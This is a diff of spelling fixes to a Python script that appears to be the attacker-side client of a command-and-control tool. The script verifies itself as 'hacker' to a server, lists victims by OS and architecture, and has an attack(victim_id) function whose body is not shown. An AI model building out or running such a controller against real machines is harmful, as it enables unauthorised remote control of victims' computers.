@@ -18,20 +18,20 @@ def send_computer_info(sock):
     my_system = platform.uname()
     os = my_system.system
     arch = my_system.machine
-    computer_info = json.dumps({"os": os, "arch": arch, "name": my_system.node})  # Sterialize the computer info
+    computer_info = json.dumps({"os": os, "arch": arch, "name": my_system.node})  # Serialize the computer info
     ut.send_message(computer_info, sock)
 
 
 def send_verification(sock):
     ut.send_message("hacker", sock)
-    verification_message = ut.recieve_message(sock)
+    verification_message = ut.receive_message(sock)
 
     if verification_message == ct.UNVERIFIED_MESSAGE:
         ut.log("error", "Verification failed! exiting...")
         exit(1)
 
     else:
-        ut.log("success", "Vertification Succeeded!")
+        ut.log("success", "Verification Succeeded!")
 
 
 def attack(victim_id, sock):
@@ -47,7 +47,7 @@ def list_victims(sock, os=None, arch=None, name=None):
     try:
         ut.send_message("get_victims", sock)
 
-        victims = ut.recieve_message(sock)
+        victims = ut.receive_message(sock)
         if victims is not None:
             victims = json.loads(victims)
             # Filter the victims according to the args
@@ -58,7 +58,7 @@ def list_victims(sock, os=None, arch=None, name=None):
                 print(print_form.format(id, victim['name'], victim['os'], victim['arch']))
             print()
     except BrokenPipeError:
-        # May be some kind of connection error might happes so
+        # May be some kind of connection error might happens so
         # we need to notify the hacker
         ut.log("error", "connection with the server has been lost!")
 
@@ -67,10 +67,10 @@ def start():
     try:
         sock = initiate()
     except IOError:
-        ut.log("error", "IOerror occured, Server might be offline")
+        ut.log("error", "IOerror occurred, Server might be offline")
         exit(1)
 
-    # Verifiying the client
+    # Verifying the client
     send_verification(sock)
 
     commands_with_funcs = {
